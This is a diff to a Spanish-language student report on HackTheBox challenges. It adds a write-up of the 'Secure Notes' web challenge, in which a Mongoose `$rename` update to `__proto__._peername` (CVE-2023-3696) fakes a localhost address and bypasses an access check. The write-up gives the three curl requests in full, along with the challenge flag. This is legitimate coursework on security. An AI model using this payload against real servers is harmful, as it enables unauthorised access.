@@ -11,7 +11,7 @@ date: "17 noviembre, 2026"
 | Estudiante            | Djedrielle Alexander - 2024154899   |
 | Estudiante            | Sebastian Donoso - 2024070154       |
 | Profesor              | Dr. Herson Esquivel Vargas          |
-| Puntos acumulados     | 1560 / 2300 XP                      |
+| Puntos acumulados     | 2080 / 2300 XP                      |
 
 ---
 
@@ -1052,6 +1052,94 @@ HTB{W3iRd_RUnT1m3_DEC}
 
 ---
 
+---
+
+## 1.8 Secure Notes
+
+| Campo                | Valor                        |
+|----------------------|------------------------------|
+| Categoría            | Web                          |
+| Dificultad           | Easy                         |
+| Puntos (XP reward)   | 260                          |
+| Fecha de resolución  | 13/11/2026                   |
+| Resuelto por         | Djedrielle                   |
+
+### Descripción del reto
+
+Reto de Web que entrega el código fuente de una aplicación de notas en Node.js (Express + MongoDB/Mongoose). Expone un endpoint `/flag` que solo responde si la petición proviene de `localhost` (`127.0.0.1`/`::1`). El objetivo es burlar esa restricción para obtener la bandera.
+
+### Procedimiento
+
+**Paso 1 — Reconocimiento / análisis del código fuente**
+
+Se revisó el código del servidor. El endpoint `/flag` compara `req.connection.remoteAddress` contra direcciones de localhost; los demás endpoints manipulan notas:
+
+- `/create` — crea una nota (valida que `title`/`content` sean strings).
+- `/get/:noteId` — consulta una nota por id.
+- `/update` — `Note.findByIdAndUpdate(noteId, req.body)`: pasa el cuerpo JSON **completo** como documento de actualización, sin filtrar campos.
+
+Revisando el despliegue (`Dockerfile`, `supervisord.conf`) se confirma que **no hay reverse proxy ni bot** y que Node se expone directo. Por tanto `remoteAddress` es la IP real del cliente: **no existe SSRF** ni forma de "aparentar" ser localhost por red. La versión de Mongoose es **7.2.4**.
+
+![endpoint_flag](imagenes/endpoint_flag.png)
+
+![endpoint_update](imagenes/endpoint_update.png)
+
+**Paso 2 — Identificación de la vulnerabilidad**
+
+`/update` pasa `req.body` sin sanear a `findByIdAndUpdate`. Mongoose **7.2.4** es vulnerable a **Prototype Pollution (CVE-2023-3696)**: un documento de actualización con el operador `$rename` cuyo destino contiene `__proto__` contamina `Object.prototype` cuando Mongoose rehidrata el documento.
+
+El *gadget* que convierte esa contaminación en bypass es una propiedad interna de los sockets de Node: `remoteAddress` se obtiene de `socket._getpeername().address`, y `_getpeername()` devuelve `this._peername` **si ya existe** (sin consultar la IP real del socket). Al contaminar `Object.prototype._peername = { address: '127.0.0.1', family: 'IPv4' }`, cualquier socket nuevo hereda esa dirección y el chequeo de `/flag` pasa.
+
+![mogoose_version](imagenes/mogoose_version.png)
+
+**Paso 3 — Explotación**
+
+Cadena de tres peticiones:
+
+1. Crear una nota con los valores a inyectar (dirección y familia):
+```bash
+curl -s http://<HOST>:<PORT>/create -H 'Content-Type: application/json' \
+  -d '{"title":"127.0.0.1","content":"IPv4"}'
+```
+2. Mover esos valores a rutas `__proto__` con `$rename` (dispara la contaminación al releer el documento):
+```bash
+curl -s http://<HOST>:<PORT>/update -H 'Content-Type: application/json' \
+  -d '{"noteId":"<ID>","$rename":{"title":"__proto__._peername.address","content":"__proto__._peername.family"}}'
+```
+3. Pedir la flag en una conexión nueva; el chequeo de localhost ya se evade:
+```bash
+curl -s http://<HOST>:<PORT>/flag
+```
+
+![secure_notes_flag](imagenes/secure_notes_flag.png)
+
+### Herramientas utilizadas
+
+| Herramienta                               | Uso en el reto                                  |
+|-------------------------------------------|-------------------------------------------------|
+| curl / Burp Suite                         | Enviar las peticiones del exploit               |
+| Lectura de código (Node/Express/Mongoose) | Identificar el endpoint vulnerable y el gadget  |
+
+### Debilidad (CWE)
+
+**CWE-1321: Modificación indebida de atributos del prototipo de objetos ("Prototype Pollution")**
+
+El endpoint `/update` pasa `req.body` sin sanear a `findByIdAndUpdate`; con el operador `$rename` hacia `__proto__._peername`, Mongoose 7.2.4 (CVE-2023-3696) escribe en `Object.prototype`, contaminando todos los objetos del proceso.
+
+### Patrón de ataque (CAPEC)
+
+**CAPEC-676: Inyección NoSQL**
+
+Se inyectó el operador de MongoDB `$rename` dentro del JSON de `/update` para escribir en una ruta `__proto__`, convirtiendo la inyección NoSQL en contaminación de prototipo que falsea `remoteAddress` y burla el control de acceso de `/flag`.
+
+### Bandera
+
+```
+HTB{m0ng00s3_pr0t0typ3_p0llus10n_c0mb1n3d_w1th_1nt3rn4l_n0d3_g4dg3ts!}
+```
+
+---
+
 # 2. Calendario de resolución
 
 | #  | Fecha Inicio | Reto       | Categoría  | Puntos | Fecha Fin    | Integrante  |
@@ -1063,6 +1151,7 @@ HTB{W3iRd_RUnT1m3_DEC}
 | 5  | 29/10/2026   | Cyberpsychosis | Reversing | 260 | 30/10/2026   | Sebastian   |
 | 6  | 9/11/2026    | TreaPortal | Web        | 260    | 9/11/2026    | Sebastian   |
 | 7  | 12/11/2026   | Partial Encryption | Reversing | 260 | 12/11/2026 | Djedrielle  |
+| 8  | 13/11/2026   | Secure Notes | Web      | 260    | 13/11/2026   | Djedrielle  |
 | …  |              |            |            |        |              |             |
 
 ---
@@ -1078,8 +1167,9 @@ HTB{W3iRd_RUnT1m3_DEC}
 | Cyberpsychosis | Reversing |            |  X           |
 | TreaPortal | Web         |              |  X           |
 | Partial Encryption | Reversing | X      |              |
+| Secure Notes | Web       | X            |              |
 | …          |             |              |              |
-| **Total**  |             | **780**      | **1040**     |
+| **Total**  |             | **1040**     | **1040**     |
 
 ### Verificación de requisitos
 
@@ -1088,5 +1178,5 @@ HTB{W3iRd_RUnT1m3_DEC}
 | Mínimo 2300 puntos (XP)            | [Sí/No]  |
 | Al menos 2 retos de Pwn            | Sí       |
 | Al menos 2 retos de Reversing      | [Sí/No]  |
-| Al menos 2 retos de Web            | [Sí/No]  |
+| Al menos 2 retos de Web            | Sí       |
 | Cada reto vale ≤ 500 puntos        | [Sí/No]  |
